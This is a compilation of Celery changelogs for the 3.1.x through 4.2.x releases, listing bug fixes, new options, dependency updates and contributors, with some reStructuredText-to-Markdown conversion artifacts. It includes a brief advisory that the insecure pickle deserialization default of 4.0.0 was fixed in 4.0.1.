result backend: expiry value can now be 0 (Issue #1661).  - Censoring settings now accounts for non-string keys (Issue #1663).  - App: New``autofinalize`option.      Apps are automatically finalized when the task registry is accessed.     You can now disable this behavior so that an exception is raised     instead.      Example:`\`python app = Celery(autofinalize=False)

</div>

> \# raises RuntimeError tasks = app.tasks
> 
> @app.task def add(x, y): return x + y
> 
> \# raises RuntimeError add.delay(2, 2)
> 
> app.finalize() \# no longer raises: tasks = app.tasks add.delay(2, 2)

  - The worker didn't send monitoring events during shutdown.

  - Worker: Mingle and gossip is now automatically disabled when used with an unsupported transport (Issue \#1664).

  - `celery` command: Preload options now supports the rare `--opt value` format (Issue \#1668).

  - `celery` command: Accidentally removed options appearing before the sub-command, these are now moved to the end instead.

  - Worker now properly responds to `inspect stats` commands even if received before start-up is complete (Issue \#1659).

  - `task_postrun` is now sent within a `finally` block, to make sure the signal is always sent.

  - Beat: Fixed syntax error in string formatting.
    
    > Contributed by :github\_user:<span class="title-ref">nadad</span>.

  - Fixed typos in the documentation.
    
    > Fixes contributed by Loic Bistuer, :github\_user:<span class="title-ref">sunfinite</span>.

  - Nested chains now works properly when constructed using the `chain` type instead of the `|` operator (Issue \#1656).

<div id="version-3.1.4">

3.1.4 `` ` ===== :release-date: 2013-11-15 11:40 p.m. UTC :release-by: Ask Solem  - Now depends on [Kombu 3.0.5 <kombu:version-3.0.5>](#kombu-3.0.5-<kombu:version-3.0.5>).  - Now depends on :mod:`billiard` 3.3.0.7  - Worker accidentally set a default socket timeout of 5 seconds.  - Django: Fix-up now sets the default app so that threads will use   the same app instance (e.g., for :command:`manage.py runserver`).  - Worker: Fixed Unicode error crash at start-up experienced by some users.  - Calling ``.apply\_async`on an empty chain now works again (Issue #1650).  - The`celery multi show``command now generates the same arguments   as the start command does.  - The :option:`--app <celery --app>` argument could end up using a module   object instead of an app instance (with a resulting crash).  - Fixed a syntax error problem in the beat init-script.      Fix contributed by Vsevolod.  - Tests now passing on PyPy 2.1 and 2.2.  .. _version-3.1.3:  3.1.3 ===== :release-date: 2013-11-13 00:55 a.m. UTC :release-by: Ask Solem  - Fixed compatibility problem with Python 2.7.0 - 2.7.5 (Issue #1637)``unpack\_from`started supporting`memoryview``arguments     in Python 2.7.6.  - Worker: :option:`-B <celery worker -B>` argument accidentally closed   files used for logging.  - Task decorated tasks now keep their docstring (Issue #1636)  .. _version-3.1.2:  3.1.2 ===== :release-date: 2013-11-12 08:00 p.m. UTC :release-by: Ask Solem  - Now depends on :mod:`billiard` 3.3.0.6  - No longer needs the billiard C extension to be installed.  - The worker silently ignored task errors.  - Django: Fixed``ImproperlyConfigured``error raised   when no database backend specified.      Fix contributed by :github_user:`j0hnsmith`.  - Prefork pool: Now using``\_multiprocessing.read`with`memoryview`if available.  -`close\_open\_fds`now uses`os.closerange`if available.  -`get\_fdmax`now takes value from`sysconfig``if possible.  .. _version-3.1.1:  3.1.1 ===== :release-date: 2013-11-11 06:30 p.m. UTC :release-by: Ask Solem  - Now depends on :mod:`billiard` 3.3.0.4.  - Python 3: Fixed compatibility issues.  - Windows:  Accidentally showed warning that the billiard C extension   wasn't installed (Issue #1630).  - Django: Tutorial updated with a solution that sets a default   :envvar:`DJANGO_SETTINGS_MODULE` so that it doesn't have to be typed   in with the :program:`celery` command.      Also fixed typos in the tutorial, and added the settings     required to use the Django database backend.      Thanks to Chris Ward, :github_user:`orarbel`.  - Django: Fixed a problem when using the Django settings in Django 1.6.  - Django: Fix-up shouldn't be applied if the django loader is active.  - Worker:  Fixed attribute error for``human\_write\_stats`when using the   compatibility prefork pool implementation.  - Worker: Fixed compatibility with billiard without C extension.  - Inspect.conf: Now supports a`with\_defaults\`\` argument.

</div>

  - Group.restore: The backend argument wasn't respected.

## 3.1.0

  - release-date  
    2013-11-09 11:00 p.m. UTC

  - release-by  
    Ask Solem

See \[whatsnew-3.1\](\#whatsnew-3.1).

---

changelog-4.0.md

---

# Change history

This document contains change notes for bugfix releases in the 4.0.x series (latentcall), please see \[whatsnew-4.0\](\#whatsnew-4.0) for an overview of what's new in Celery 4.0.

## 4.0.2

  - release-date  
    2016-12-15 03:40 PM PST

  - release-by  
    Ask Solem

<!-- end list -->

  - **Requirements**
    
    >   - Now depends on \[Kombu 4.0.2 \<kombu:version-4.0.2\>\](\#kombu-4.0.2-\<kombu:version-4.0.2\>).

  - **Tasks**: Fixed problem with JSON serialization of <span class="title-ref">group</span> (`keys must be string` error, Issue \#3688).

  - **Worker**: Fixed JSON serialization issue when using `inspect active` and friends (Issue \#3667).

  - **App**: Fixed saferef errors when using signals (Issue \#3670).

  - **Prefork**: Fixed bug with pack requiring bytes argument on Python 2.7.5 and earlier (Issue \#3674).

  - **Tasks**: Saferepr did not handle unicode in bytestrings on Python 2 (Issue \#3676).

  - **Testing**: Added new `celery_worker_paremeters` fixture.
    
    > Contributed by **Michael Howitz**.

  - **Tasks**: Added new `app` argument to `GroupResult.restore` (Issue \#3669).
    
    > This makes the restore method behave the same way as the `GroupResult` constructor.
    > 
    > Contributed by **Andreas Pelme**.

  - **Tasks**: Fixed type checking crash when task takes `*args` on Python 3 (Issue \#3678).

  - Documentation and examples improvements by:
    
    >   - **BLAGA Razvan-Paul**
    >   - **Michael Howitz**
    >   - :github\_user:<span class="title-ref">paradox41</span>

## 4.0.1

  - release-date  
    2016-12-08 05:22 PM PST

  - release-by  
    Ask Solem

<!-- end list -->

  - \[Security: [CELERYSA-0003](https://github.com/celery/celery/tree/master/docs/sec/CELERYSA-0003.txt)\] Insecure default configuration
    
    > The default `accept_content` setting was set to allow deserialization of pickled messages in Celery 4.0.0.
    > 
    > The insecure default has been fixed in 4.0.1, and you can also configure the 4.0.0 version to explicitly only allow json serialized messages:
    > 
    >   - \`\`\`python  
    >     app.conf.accept\_content = \['json'\]

  - **Tasks**: Added new method to register class-based tasks (Issue \#3615).
    
    > To register a class based task you should now call `app.register_task`:
    > 
    > ``` python
    > from celery import Celery, Task
    > 
    > app = Celery()
    > 
    > class CustomTask(Task):
    > 
    >     def run(self):
    >         return 'hello'
    > 
    > app.register_task(CustomTask())
    > ```

  - **Tasks**: Argument checking now supports keyword-only arguments on Python3 (Issue \#3658).
    
    > Contributed by :github\_user:<span class="title-ref">sww</span>.

  - **Tasks**: The `task-sent` event was not being sent even if configured to do so (Issue \#3646).

  - **Worker**: Fixed AMQP heartbeat support for eventlet/gevent pools (Issue \#3649).

  - **App**: `app.conf.humanize()` would not work if configuration not finalized (Issue \#3652).

  - **Utils**: `saferepr` attempted to show iterables as lists and mappings as dicts.

  - **Utils**: `saferepr` did not handle unicode-errors when attempting to format `bytes` on Python 3 (Issue \#3610).

  - **Utils**: `saferepr` should now properly represent byte strings with non-ascii characters (Issue \#3600).

  - **Results**: Fixed bug in elasticsearch where \_index method missed the body argument (Issue \#3606).
    
    > Fix contributed by **何翔宇** (Sean Ho).

  - **Canvas**: Fixed <span class="title-ref">ValueError</span> in chord with single task header (Issue \#3608).
    
    > Fix contributed by **Viktor Holmqvist**.

  - **Task**: Ensure class-based task has name prior to registration (Issue \#3616).
    
    > Fix contributed by **Rick Wargo**.

  - **Beat**: Fixed problem with strings in shelve (Issue \#3644).
    
    > Fix contributed by **Alli**.

  - **Worker**: Fixed <span class="title-ref">KeyError</span> in `inspect stats` when `-O` argument set to something other than `fast` or `fair` (Issue \#3621).

  - **Task**: Retried tasks were no longer sent to the original queue (Issue \#3622).

  - **Worker**: Python 3: Fixed None/int type comparison in `apps/worker.py` (Issue \#3631).

  - **Results**: Redis has a new `redis_socket_connect_timeout` setting.

  - **Results**: Redis result backend passed the `socket_connect_timeout` argument to UNIX socket based connections by mistake, causing a crash.

  - **Worker**: Fixed missing logo in worker splash screen when running on Python 3.x (Issue \#3627).
    
    > Fix contributed by **Brian Luan**.

  - **Deps**: Fixed `celery[redis]` bundle installation (Issue \#3643).
    
    > Fix contributed by **Rémi Marenco**.

  - **Deps**: Bundle `celery[sqs]` now also requires `pycurl` (Issue \#3619).

  - **Worker**: Hard time limits were no longer being respected (Issue \#3618).

  - **Worker**: Soft time limit log showed `Trues` instead of the number of seconds.

  - **App**: `registry_cls` argument no longer had any effect (Issue \#3613).

  - **Worker**: Event producer now uses `connection_for_Write` (Issue \#3525).

  - **Results**: Redis/memcache backends now uses `result_expires` to expire chord counter (Issue \#3573).
    
    > Contributed by **Tayfun Sen**.

  - **Django**: Fixed command for upgrading settings with Django (Issue \#3563).
    
    > Fix contributed by **François Voron**.

  - **Testing**: Added a `celery_parameters` test fixture to be able to use customized `Celery` init parameters. (\#3626)
    
    > Contributed by **Steffen Allner**.

  - Documentation improvements contributed by
    
    >   - :github\_user:<span class="title-ref">csfeathers</span>
    >   - **Moussa Taifi**
    >   - **Yuhannaa**
    >   - **Laurent Peuch**
    >   - **Christian**
    >   - **Bruno Alla**
    >   - **Steven Johns**
    >   - :github\_user:<span class="title-ref">tnir</span>
    >   - **GDR\!**

<div id="version-4.0.0">

4.0.0 `` ` ===== :release-date: 2016-11-04 02:00 P.M PDT :release-by: Ask Solem  See [whatsnew-4.0](#whatsnew-4.0) (in :file:`docs/whatsnew-4.0.rst`).  .. _version-4.0.0rc7:  4.0.0rc7 ======== :release-date: 2016-11-02 01:30 P.M PDT  Important notes ---------------  - Database result backend related setting names changed from ``[sqlalchemy]()*\`\` -\> \`\`database\_*`.      The`[sqlalchemy]()`named settings won't work at all in this     version so you need to rename them.  This is a last minute change,     and as they were not supported in 3.1 we will not be providing     aliases.  -`chain(A, B, C)`now works the same way as`A | B | C`.      This means calling`chain()\`\` might not actually return a chain, it can return a group or any other type depending on how the workflow can be optimized.

</div>

---

changelog-4.1.md

---

# Change history

This document contains change notes for bugfix releases in the 4.1.x series, please see \[whatsnew-4.2\](\#whatsnew-4.2) for an overview of what's new in Celery 4.2.

## 4.1.1

  - release-date  
    2018-05-21 12:48 PM PST

  - release-by  
    Omer Katz

\> **Important** \> Please upgrade as soon as possible or pin Kombu to 4.1.0.

  - **Breaking Change**: The module <span class="title-ref">async</span> in Kombu changed to <span class="title-ref">asynchronous</span>.

Contributed by **Omer Katz & Asif Saifuddin Auvi**

## 4.1.0

  - release-date  
    2017-07-25 00:00 PM PST

  - release-by  
    Omer Katz

<!-- end list -->

  - **Configuration**: CELERY\_SEND\_EVENTS instead of CELERYD\_SEND\_EVENTS for 3.1.x compatibility (\#3997)

> Contributed by **abhinav nilaratna**.

  - **App**: Restore behavior so Broadcast queues work. (\#3934)

> Contributed by **Patrick Cloke**.

  - **Sphinx**: Make appstr use standard format (\#4134) (\#4139)

> Contributed by **Preston Moore**.

  - **App**: Make id, name always accessible from logging.Formatter via extra (\#3994)

> Contributed by **Yoichi NAKAYAMA**.

  - **Worker**: Add worker\_shutting\_down signal (\#3998)

> Contributed by **Daniel Huang**.

  - **PyPy**: Support PyPy version 5.8.0 (\#4128)

> Contributed by **Omer Katz**.

  - **Results**: Elasticsearch: Fix serializing keys (\#3924)

> Contributed by :github\_user:<span class="title-ref">staticfox</span>.

  - **Canvas**: Deserialize all tasks in a chain (\#4015)

> Contributed by :github\_user:<span class="title-ref">fcoelho</span>.

  - **Systemd**: Recover loglevel for ExecStart in systemd config (\#4023)

> Contributed by **Yoichi NAKAYAMA**.

  - **Sphinx**: Use the Sphinx add\_directive\_to\_domain API. (\#4037)

> Contributed by **Patrick Cloke**.

  - **App**: Pass properties to before\_task\_publish signal (\#4035)

> Contributed by **Javier Domingo Cansino**.

  - **Results**: Add SSL option for Redis backends (\#3831)

> Contributed by **Chris Kuehl**.

  - **Beat**: celery.schedule.crontab: fix reduce (\#3826) (\#3827)

> Contributed by **Taylor C. Richberger**.

  - **State**: Fix celery issues when using flower REST API

> Contributed by **Thierry RAMORASOAVINA**.

  - **Results**: Elasticsearch: Fix serializing document id.

> Contributed by **Acey9**.

  - **Beat**: Make shallow copy of schedules dictionary

> Contributed by **Brian May**.

  - **Beat**: Populate heap when periodic tasks are changed

> Contributed by **Wojciech Żywno**.

  - **Task**: Allow class methods to define tasks (\#3952)

> Contributed by **georgepsarakis**.

  - **Platforms**: Always return boolean value when checking if signal is supported (\#3962).

> Contributed by **Jian Yu**.

  - **Canvas**: Avoid duplicating chains in chords (\#3779)

> Contributed by **Ryan Hiebert**.

  - **Canvas**: Lookup task only if list has items (\#3847)

> Contributed by **Marc Gibbons**.

  - **Results**: Allow unicode message for exception raised in task (\#3903)

> Contributed by **George Psarakis**.

  - **Python3**: Support for Python 3.6 (\#3904, \#3903, \#3736)

> Contributed by **Jon Dufresne**, **George Psarakis**, **Asif Saifuddin Auvi**, **Omer Katz**.

  - **App**: Fix retried tasks with expirations (\#3790)

> Contributed by **Brendan MacDonell**.

  -   - Fixes items format route in docs (\#3875)

> Contributed by **Slam**.

  - **Utils**: Fix maybe\_make\_aware (\#3850)

> Contributed by **Taylor C. Richberger**.

  - **Task**: Fix task ETA issues when timezone is defined in configuration (\#3867)

> Contributed by **George Psarakis**.

  - **Concurrency**: Consumer does not shutdown properly when embedded in gevent application (\#3746)

> Contributed by **Arcadiy Ivanov**.

  - **Canvas**: Fix \#3725: Task replaced with group does not complete (\#3731)

> Contributed by **Morgan Doocy**.

  - **Task**: Correct order in chains with replaced tasks (\#3730)

> Contributed by **Morgan Doocy**.

  - **Result**: Enable synchronous execution of sub-tasks (\#3696)

> Contributed by **shalev67**.

  - **Task**: Fix request context for blocking task apply (added hostname) (\#3716)

> Contributed by **Marat Sharafutdinov**.

  - **Utils**: Fix task argument handling (\#3678) (\#3693)

> Contributed by **Roman Sichny**.

  - **Beat**: Provide a transparent method to update the Scheduler heap (\#3721)

> Contributed by **Alejandro Pernin**.

  - **Beat**: Specify default value for pidfile option of celery beat. (\#3722)

> Contributed by **Arnaud Rocher**.

  - **Results**: Elasticsearch: Stop generating a new field every time when a new result is being put (\#3708)

> Contributed by **Mike Chen**.

  - **Requirements**
    
    >   - Now depends on \[Kombu 4.1.0 \<kombu:version-4.1.0\>\](\#kombu-4.1.0-\<kombu:version-4.1.0\>).

  - **Results**: Elasticsearch now reuses fields when new results are added.
    
    > Contributed by **Mike Chen**.

  - **Results**: Fixed MongoDB integration when using binary encodings (Issue \#3575).
    
    > Contributed by **Andrew de Quincey**.

  - **Worker**: Making missing `*args` and `**kwargs` in Task protocol 1 return empty value in protocol 2 (Issue \#3687).
    
    > Contributed by **Roman Sichny**.

  - **App**: Fixed <span class="title-ref">TypeError</span> in AMQP when using deprecated signal (Issue \#3707).
    
    > Contributed by :github\_user:<span class="title-ref">michael-k</span>.

  - **Beat**: Added a transparent method to update the scheduler heap.
    
    > Contributed by **Alejandro Pernin**.

  - **Task**: Fixed handling of tasks with keyword arguments on Python 3 (Issue \#3657).
    
    > Contributed by **Roman Sichny**.

  - **Task**: Fixed request context for blocking task apply by adding missing hostname attribute.
    
    > Contributed by **Marat Sharafutdinov**.

  - **Task**: Added option to run subtasks synchronously with `disable_sync_subtasks` argument.
    
    > Contributed by :github\_user:<span class="title-ref">shalev67</span>.

  - **App**: Fixed chaining of replaced tasks (Issue \#3726).
    
    > Contributed by **Morgan Doocy**.

  - **Canvas**: Fixed bug where replaced tasks with groups were not completing (Issue \#3725).
    
    > Contributed by **Morgan Doocy**.

  - **Worker**: Fixed problem where consumer does not shutdown properly when embedded in a gevent application (Issue \#3745).
    
    > Contributed by **Arcadiy Ivanov**.

  - **Results**: Added support for using AWS DynamoDB as a result backend (\#3736).
    
    > Contributed by **George Psarakis**.

  - **Testing**: Added caching on pip installs.
    
    > Contributed by :github\_user:<span class="title-ref">orf</span>.

  - **Worker**: Prevent consuming queue before ready on startup (Issue \#3620).
    
    > Contributed by **Alan Hamlett**.

  - **App**: Fixed task ETA issues when timezone is defined in configuration (Issue \#3753).
    
    > Contributed by **George Psarakis**.

  - **Utils**: `maybe_make_aware` should not modify datetime when it is already timezone-aware (Issue \#3849).
    
    > Contributed by **Taylor C. Richberger**.

  - **App**: Fixed retrying tasks with expirations (Issue \#3734).
    
    > Contributed by **Brendan MacDonell**.

  - **Results**: Allow unicode message for exceptions raised in task (Issue \#3858).
    
    > Contributed by :github\_user:<span class="title-ref">staticfox</span>.

  - **Canvas**: Fixed <span class="title-ref">IndexError</span> raised when chord has an empty header.
    
    > Contributed by **Marc Gibbons**.

  - **Canvas**: Avoid duplicating chains in chords (Issue \#3771).
    
    > Contributed by **Ryan Hiebert** and **George Psarakis**.

  - **Utils**: Allow class methods to define tasks (Issue \#3863).
    
    > Contributed by **George Psarakis**.

  - **Beat**: Populate heap when periodic tasks are changed.
    
    > Contributed by :github\_user:<span class="title-ref">wzywno</span> and **Brian May**.

  - **Results**: Added support for Elasticsearch backend options settings.
    
    > Contributed by :github\_user:<span class="title-ref">Acey9</span>.

  - **Events**: Ensure `Task.as_dict()` works when not all information about task is available.
    
    > Contributed by :github\_user:<span class="title-ref">tramora</span>.

  - **Schedules**: Fixed pickled crontab schedules to restore properly (Issue \#3826).
    
    > Contributed by **Taylor C. Richberger**.

  - **Results**: Added SSL option for redis backends (Issue \#3830).
    
    > Contributed by **Chris Kuehl**.

  - Documentation and examples improvements by:
    
    >   - **Bruno Alla**
    >   - **Jamie Alessio**
    >   - **Vivek Anand**
    >   - **Peter Bittner**
    >   - **Kalle Bronsen**
    >   - **Jon Dufresne**
    >   - **James Michael DuPont**
    >   - **Sergey Fursov**
    >   - **Samuel Dion-Girardeau**
    >   - **Daniel Hahler**
    >   - **Mike Helmick**
    >   - **Marc Hörsken**
    >   - **Christopher Hoskin**
    >   - **Daniel Huang**
    >   - **Primož Kerin**
    >   - **Michal Kuffa**
    >   - **Simon Legner**
    >   - **Anthony Lukach**
    >   - **Ed Morley**
    >   - **Jay McGrath**
    >   - **Rico Moorman**
    >   - **Viraj Navkal**
    >   - **Ross Patterson**
    >   - **Dmytro Petruk**
    >   - **Luke Plant**
    >   - **Eric Poelke**
    >   - **Salvatore Rinchiera**
    >   - **Arnaud Rocher**
    >   - **Kirill Romanov**
    >   - **Simon Schmidt**
    >   - **Tamer Sherif**
    >   - **YuLun Shih**
    >   - **Ask Solem**
    >   - **Tom 'Biwaa' Riat**
    >   - **Arthur Vigil**
    >   - **Joey Wilhelm**
    >   - **Jian Yu**
    >   - **YuLun Shih**
    >   - **Arthur Vigil**
    >   - **Joey Wilhelm**
    >   - :github\_user:<span class="title-ref">baixuexue123</span>
    >   - :github\_user:<span class="title-ref">bronsen</span>
    >   - :github\_user:<span class="title-ref">michael-k</span>
    >   - :github\_user:<span class="title-ref">orf</span>
    >   - :github\_user:<span class="title-ref">3lnc</span>

---

changelog-4.2.md

---

# Change history

This document contains change notes for bugfix releases in the 4.2.x series, please see \[whatsnew-4.2\](\#whatsnew-4.2) for an overview of what's new in Celery 4.2.

## 4.2.1

  - release-date  
    2018-07-18 11:00 AM IST

  - release-by  
    Omer Katz

<!-- end list -->

  - **Result Backend**: Fix deserialization of exceptions that are present in the producer codebase but not in the consumer codebase.
    
    Contributed by **John Arnold**

  - **Message Protocol Compatibility**: Fix error caused by an invalid (None) timelimit value in the message headers when migrating messages from 3.x to 4.x.
    
    Contributed by **Robert Kopaczewski**

  - **Result Backend**: Fix serialization of exception arguments when exception arguments are not JSON serializable by default.
    
    Contributed by **Tom Booth**

  - **Worker**: Fixed multiple issues with rate limited tasks
    
    Maintain scheduling order. Fix possible scheduling of a <span class="title-ref">celery.worker.request.Request</span> with the wrong <span class="title-ref">kombu.utils.limits.TokenBucket</span> which could cause tasks' rate limit to behave incorrectly. Fix possible duplicated execution of tasks that were rate limited or if ETA/Countdown was provided for them.
    
    Contributed by :github\_user:<span class="title-ref">ideascf</span>

  - **Worker**: Defensively handle invalid timelimit header values in requests.
    
    Contributed by **Omer Katz**

Documentation fixes:

>   - **Matt Wiens**
>   - **Seunghun Lee**
>   - **Lewis M. Kabui**
>   - **Prathamesh Salunkhe**

## 4.2.0

  - release-date  
    2018-06-10 21:30 PM IST

  - release-by  
    Omer Katz

<!-- end list -->

  - **Task**: Add `ignore_result` as task execution option (\#4709, \#3834)
    
    > Contributed by **Andrii Kostenko** and **George Psarakis**.

  - **Redis Result Backend**: Do not create PubSub subscriptions when results are ignored (\#4709, \#3834)
    
    > Contributed by **Andrii Kostenko** and **George Psarakis**.

  - **Redis Result Backend**: Result consumer always unsubscribes when task state is ready (\#4666)
    
    > Contributed by **George Psarakis**.

  - **Development/Testing**: Add docker-compose and base Dockerfile for development (\#4482)
    
    > Contributed by **Chris Mitchell**.

  - **Documentation/Sphinx**: Teach autodoc to document tasks if undoc-members is not set (\#4588)
    
    > Contributed by **Leo Singer**.

  - **Documentation/Sphinx**: Put back undoc-members option in sphinx test (\#4586)
    
    > Contributed by **Leo Singer**.

  - **Documentation/Sphinx**: Sphinx autodoc picks up tasks automatically only if <span class="title-ref">undoc-members</span> is set (\#4584)
    
    > Contributed by **Leo Singer**.

  - **Task**: Fix shadow\_name issue when using previous version Task class (\#4572)
    
    > Contributed by :github\_user:<span class="title-ref">pachewise</span>.

  - **Task**: Add support for bound tasks as <span class="title-ref">link\_error</span> parameter (Fixes \#3723) (\#4545)
    
    > Contributed by :github\_user:<span class="title-ref">brabiega</span>.

  - **Deployment**: Add a command line option for setting the Result Backend URL (\#4549)
    
    > Contributed by :github\_user:<span class="title-ref">y0ngdi</span>.

  - **CI**: Enable pip cache in appveyor build (\#4546)
    
    > Contributed by **Thijs Triemstra**.

  - **Concurrency/Asynpool**: Fix errno property name shadowing.
    
    > Contributed by **Omer Katz**.

  - **DynamoDB Backend**: Configurable endpoint URL (\#4532)
    
    > Contributed by **Bohdan Rybak**.

  - **Timezones**: Correctly detect UTC timezone and timezone from settings (Fixes \#4517) (\#4519)
    
    > Contributed by :github\_user:<span class="title-ref">last-partizan</span>.

  - **Control**: Cleanup the mailbox's producer pool after forking (\#4472)
    
    > Contributed by **Nick Eaket**.

  - **Documentation**: Start Celery and Celery Beat on Azure WebJob (\#4484)
    
    > Contributed by **PauloPeres**.

  - **Celery Beat**: Schedule due tasks on startup, after Beat restart has occurred (\#4493)
    
    > Contributed by **Igor Kasianov**.

  - **Worker**: Use absolute time when task is accepted by worker pool (\#3684)
    
    > Contributed by **Régis Behmo**.

  - **Canvas**: Propagate arguments to chains inside groups (\#4481)
    
    > Contributed by **Chris Mitchell**.

  - **Canvas**: Fix <span class="title-ref">Task.replace</span> behavior in nested chords (fixes \#4368) (\#4369)
    
    > Contributed by **Denis Shirokov** & **Alex Hill**.

  - **Installation**: Pass python\_requires argument to setuptools (\#4479)
    
    > Contributed by **Jon Dufresne**.

  - **Message Protocol Compatibility**: Handle "hybrid" messages that have moved between Celery versions (\#4358) (Issue \#4356)
    
    > Contributed by **Russell Keith-Magee**.

  - **Canvas**: request on\_timeout now ignores soft time limit exception (fixes \#4412) (\#4473)
    
    > Contributed by **Alex Garel**.

  - **Redis Result Backend**: Integration test to verify PubSub unsubscriptions (\#4468)
    
    > Contributed by **George Psarakis**.

  - **Message Protocol Properties**: Allow the shadow keyword argument and the shadow\_name method to set shadow properly (\#4381)
    
    > Contributed by :github\_user:<span class="title-ref">hclihn</span>.

  - **Canvas**: Run chord\_unlock on same queue as chord body (\#4448) (Issue \#4337)
    
    > Contributed by **Alex Hill**.

  - **Canvas**: Support chords with empty header group (\#4443)
    
    > Contributed by **Alex Hill**.

  - **Timezones**: make astimezone call in localize more safe (\#4324)
    
    > Contributed by **Matt Davis**.

  - **Canvas**: Fix length-1 and nested chords (\#4437) (Issues \#4393, \#4055, \#3885, \#3597, \#3574, \#3323, \#4301)
    
    > Contributed by **Alex Hill**.

  - **CI**: Run [Openstack Bandit](https://pypi.org/project/bandit/1.0.1/) in Travis CI in order to detect security issues.
    
    > Contributed by **Omer Katz**.

  - **CI**: Run [isort](https://github.com/timothycrosley/isort) in Travis CI in order to lint Python **import** statements.
    
    > Contributed by **Omer Katz**.

  - **Canvas**: Resolve TypeError on <span class="title-ref">.get</span> from nested groups (\#4432) (Issue \#4274)
    
    > Contributed by **Misha Wolfson**.

  - **CouchDB Backend**: Correct CouchDB key string type for Python 2/3 compatibility (\#4166)
    
    > Contributed by :github\_user:<span class="title-ref">fmind</span> && **Omer Katz**.

  - **Group Result**: Fix current\_app fallback in GroupResult.restore() (\#4431)
    
    > Contributed by **Alex Hill**.

  - **Consul Backend**: Correct key string type for Python 2/3 compatibility (\#4416)
    
    > Contributed by **Wido den Hollander**.

  - **Group Result**: Correctly restore an empty GroupResult (\#2202) (\#4427)
    
    > Contributed by **Alex Hill** & **Omer Katz**.

  - **Result**: Disable synchronous waiting for sub-tasks on eager mode(\#4322)
    
    > Contributed by **Denis Podlesniy**.

  - **Celery Beat**: Detect timezone or Daylight Saving Time changes (\#1604) (\#4403)
    
    > Contributed by **Vincent Barbaresi**.

  - **Canvas**: Fix append to an empty chain. Fixes \#4047. (\#4402)
    
    > Contributed by **Omer Katz**.

  - **Task**: Allow shadow to override task name in trace and logging messages. (\#4379)
    
    > Contributed by :github\_user:<span class="title-ref">hclihn</span>.

  - **Documentation/Sphinx**: Fix getfullargspec Python 2.x compatibility in contrib/sphinx.py (\#4399)
    
    > Contributed by **Javier Martin Montull**.

  - **Documentation**: Updated installation instructions for SQS broker (\#4382)
    
    > Contributed by **Sergio Fernandez**.

  - **Celery Beat**: Better equality comparison for ScheduleEntry instances (\#4312)
    
    > Contributed by :github\_user:<span class="title-ref">mariia-zelenova</span>.

  - **Task**: Adding 'shadow' property to as\_task\_v2 (\#4350)
    
    > Contributed by **Marcelo Da Cruz Pinto**.

  - Try to import directly, do not use deprecated imp method (\#4216)
    
    > Contributed by **Tobias Kunze**.

  - **Task**: Enable <span class="title-ref">kwargsrepr</span> and <span class="title-ref">argsrepr</span> override for modifying task argument representation (\#4260)
    
    > Contributed by **James M. Allen**.

  - **Result Backend**: Add Redis Sentinel backend (\#4144)
    
    > Contributed by **Geoffrey Bauduin**.

  - Use unique time values for Collections/LimitedSet (\#3879 and \#3891) (\#3892)
    
    > Contributed by :github\_user:<span class="title-ref">lead2gold</span>.

  - **CI**: Report coverage for all result backends.
    
    > Contributed by **Omer Katz**.

  - **Django**: Use Django DB max age connection setting (fixes \#4116) (\#4292)
    
    > Contributed by **Marco Schweighauser**.

  - **Canvas**: Properly take into account chain tasks link\_error (\#4240)
    
    > Contributed by :github\_user:<span class="title-ref">agladkov</span>.

  - **Canvas**: Allow to create group with single task (fixes issue \#4255) (\#4280)
    
    > Contributed by :github\_user:<span class="title-ref">agladkov</span>.

  - **Canvas**: Copy dictionary parameter in chord.from\_dict before modifying (fixes issue \#4223) (\#4278)
    
    > Contributed by :github\_user:<span class="title-ref">agladkov</span>.

  - **Results Backend**: Add Cassandra options (\#4224)
    
    > Contributed by **Scott Cooper**.

  - **Worker**: Apply rate limiting for tasks with ETA (\#4251)
    
    > Contributed by :github\_user:<span class="title-ref">arpanshah29</span>.

  - **Celery Beat**: support scheduler entries without a schedule (\#4235)
    
    > Contributed by **Markus Kaiserswerth**.

  - **SQS Broker**: Updated SQS requirements file with correct boto3 version (\#4231)
    
    > Contributed by **Alejandro Varas**.

  - Remove unused code from \_create\_app contextmanager (\#4204)
    
    > Contributed by **Ryan P Kilby**.

  - **Group Result**: Modify GroupResult.as\_tuple() to include parent (fixes \#4106) (\#4205)
    
    > Contributed by :github\_user:<span class="title-ref">pachewise</span>.

  - **Beat**: Set default scheduler class in beat command. (\#4189)
    
    > Contributed by :github\_user:<span class="title-ref">Kxrr</span>.

  - **Worker**: Retry signal receiver after raised exception (\#4192)
    
    > Contributed by **David Davis**.

  - **Task**: Allow custom Request class for tasks (\#3977)
    
    > Contributed by **Manuel Vázquez Acosta**.

  - **Django**: Django fixup should close all cache backends (\#4187)
    
    > Contributed by **Raphaël Riel**.

  - **Deployment**: Adds stopasgroup to the supervisor scripts (\#4200)
    
    > Contributed by :github\_user:<span class="title-ref">martialp</span>.

  - Using Exception.args to serialize/deserialize exceptions (\#4085)
    
    > Contributed by **Alexander Ovechkin**.

  - **Timezones**: Correct calculation of application current time with timezone (\#4173)
    
    > Contributed by **George Psarakis**.

  - **Remote Debugger**: Set the SO\_REUSEADDR option on the socket (\#3969)
    
    > Contributed by **Theodore Dubois**.

  - **Django**: Celery ignores exceptions raised during <span class="title-ref">django.setup()</span> (\#4146)
    
    > Contributed by **Kevin Gu**.

  - Use heartbeat setting from application configuration for Broker connection (\#4148)
    
    > Contributed by :github\_user:<span class="title-ref">mperice</span>.

  - **Celery Beat**: Fixed exception caused by next\_transit receiving an unexpected argument. (\#4103)
    
    > Contributed by **DDevine**.

  - **Task** Introduce exponential backoff with Task auto-retry (\#4101)
    
    > Contributed by **David Baumgold**.

  - **AsyncResult**: Remove weak-references to bound methods in AsyncResult promises. (\#4131)
    
    > Contributed by **Vinod Chandru**.

  - **Development/Testing**: Allow eager application of canvas structures (\#4576)
    
    > Contributed by **Nicholas Pilon**.

  - **Command Line**: Flush stderr before exiting with error code 1.
    
    > Contributed by **Antonin Delpeuch**.

  - **Task**: Escapes single quotes in kwargsrepr strings.
    
    > Contributed by **Kareem Zidane**

  - **AsyncResult**: Restore ability to join over ResultSet after fixing celery/\#3818.
    
    > Contributed by **Derek Harland**

  - **Redis Results Backend**: Unsubscribe on message success.
    
    Previously Celery would leak channels, filling the memory of the Redis instance.
    
    Contributed by **George Psarakis**

  - **Task**: Only convert eta to isoformat when it is not already a string.
    
    Contributed by **Omer Katz**

  - **Redis Results Backend**: The result\_backend setting now supports <rediss://> URIs
    
    Contributed by **James Remeika**

  - **Canvas** Keyword arguments are passed to tasks in chain as expected.
    
    Contributed by :github\_user:<span class="title-ref">tothegump</span>

  - **Django** Fix a regression causing Celery to crash when using Django.
    
    Contributed by **Jonas Haag**

